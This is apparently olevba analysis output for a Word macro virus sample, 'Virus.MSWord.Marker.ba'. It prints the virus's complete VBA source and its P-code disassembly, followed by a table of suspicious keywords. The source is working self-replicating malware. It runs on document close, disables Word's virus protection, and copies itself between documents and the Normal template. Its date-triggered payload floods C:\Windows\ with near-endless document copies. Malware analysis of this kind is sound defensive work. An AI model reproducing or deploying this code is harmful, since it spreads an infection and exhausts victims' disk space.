olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
  
  On Error GoTo Finm
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia xx"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
  
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
      Plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)

      'Ninfec = "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      Nume2 = 3
      If Nume = nume1 Or Nume = Nume2 Or Plainfec = False Then
         If DInfec = True And Plainfec = False Then
            On Error Resume Next
            For il = 1 To Plan.CodeModule.CountOfLines
                Plan.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
            'Docu.CodeModule.addfromstring Ninfec
            contemodu = Docu.CodeModule.Lines(1, Docu.CodeModule.CountOfLines)
            Plan.CodeModule.addfromstring contemodu
         End If

         If DInfec = False And Plainfec = True Then
            On Error Resume Next
            For il = 1 To Docu.CodeModule.CountOfLines
                Docu.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
           'Plan.CodeModule.addfromstring Ninfec
            contemodu = Plan.CodeModule.Lines(1, Plan.CodeModule.CountOfLines)
            Docu.CodeModule.addfromstring contemodu
         End If
         
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True And Plainfec = False Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If
  GoTo Finb
  
Finm:
  On Error Resume Next
  For il = 1 To Docu.CodeModule.CountOfLines
    Docu.CodeModule.DeleteLines 1
  Next
  GoTo Finb
Finb:
 On Error Resume Next
End Sub



















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ba
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4965 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_close())
' Line #1:
' Line #2:
' 	OnError Finm 
' Line #3:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0017 "la macro de colombia xx"
' 	VarDefn exi
' Line #5:
' 	Dim 
' 	VarDefn DInfec
' 	VarDefn planinfec (As Boolean)
' Line #6:
' 	Dim 
' 	VarDefn Docu
' 	VarDefn Plan (As Object)
' Line #7:
' 	Dim 
' 	VarDefn modulin
' 	VarDefn contemodu
' 	VarDefn Ninfec (As String)
' Line #8:
' 	Dim 
' 	VarDefn Nume (As Integer)
' Line #9:
' 	Dim 
' 	VarDefn Copform (As Object)
' Line #10:
' Line #11:
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Docu 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Plan 
' Line #14:
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #16:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Saveplan 
' Line #17:
' Line #18:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DInfec 
' Line #19:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St Plainfec 
' Line #20:
' Line #21:
' 	QuoteRem 0x0006 0x0012 "Ninfec = "'" & " ""
' Line #22:
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #24:
' Line #25:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Nume 
' Line #26:
' 	Ld Nume 
' 	St Nume 
' Line #27:
' 	LitDI2 0x0007 
' 	St nume1 
' Line #28:
' 	LitDI2 0x0003 
' 	St Nume2 
' Line #29:
' 	Ld Nume 
' 	Ld nume1 
' 	Eq 
' 	Ld Nume 
' 	Ld Nume2 
' 	Eq 
' 	Or 
' 	Ld Plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #30:
' 	Ld DInfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	OnError Finm 
' Line #36:
' 	QuoteRem 0x000C 0x0024 "Docu.CodeModule.addfromstring Ninfec"
' Line #37:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #38:
' 	Ld contemodu 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' Line #41:
' 	Ld DInfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Plainfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	OnError Finm 
' Line #47:
' 	QuoteRem 0x000B 0x0024 "Plan.CodeModule.addfromstring Ninfec"
' Line #48:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #49:
' 	Ld contemodu 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #53:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	St sd 
' Line #57:
' 	Ld sd 
' 	ArgsLd Trim 0x0001 
' 	St sd 
' Line #58:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitStr 0x000B "C:\Windows\"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC9F7 0x3B9A 
' 	For 
' Line #61:
' 	LineCont 0x0010 0F 00 08 00 1B 00 08 00 27 00 08 00 31 00 08 00
' 	LitStr 0x0002 "AA"
' 	Ld i 
' 	Concat 
' 	LitStr 0x0006 "AA.DOC"
' 	Concat 
' 	Paren 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	GoTo Finb 
' Line #65:
' Line #66:
' 	Label Finm 
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #69:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #70:
' 	StartForVariable 
' 	Next 
' Line #71:
' 	GoTo Finb 
' Line #72:
' 	Label Finb 
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

